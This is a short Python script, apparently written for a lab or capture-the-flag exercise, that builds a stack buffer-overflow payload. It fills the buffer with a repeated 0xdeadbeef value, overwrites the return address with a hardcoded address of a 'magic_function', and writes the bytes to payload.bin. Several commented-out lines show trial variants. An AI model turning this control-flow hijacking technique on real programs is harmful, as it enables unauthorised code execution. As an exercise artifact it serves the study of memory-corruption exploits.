buffer_size = 120
saved_frame_pointer = 4
value = 0xdeadbeef
fini = 0x080494e8
address_magic_function = 0x080494b1


# Create payload
payload = value.to_bytes(4, 'little')  # Value to be written in saved frame pointer

# payload += b'A' * buffer_size  # Fill the buffer
for i in range(65):
    payload += value.to_bytes(4, 'little')
# payload += fini.to_bytes(4, 'little')  # Address of magic_function

payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function
# payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function
# payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function


# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)